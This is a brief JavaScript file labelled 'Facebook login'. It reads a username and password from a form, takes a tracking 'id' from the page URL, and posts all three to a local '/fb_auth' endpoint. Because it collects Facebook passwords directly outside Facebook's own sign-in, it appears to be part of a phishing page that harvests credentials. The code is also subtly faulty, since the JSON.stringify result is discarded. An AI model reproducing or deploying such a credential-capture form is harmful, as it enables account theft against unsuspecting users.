/**
 * Facebook login
 */

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

function send() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var usercode = getParameterByName('id');

    var data = {
        "username": username,
        "password": password,
        "tanda_id": usercode
    };

    JSON.stringify(data);

    var xhr = new XMLHttpRequest();
    xhr.open("POST", '/fb_auth', true);
    xhr.setRequestHeader('Content-type', 'application/json');
    //xhr.responseType = 'json';
    xhr.send(data);
}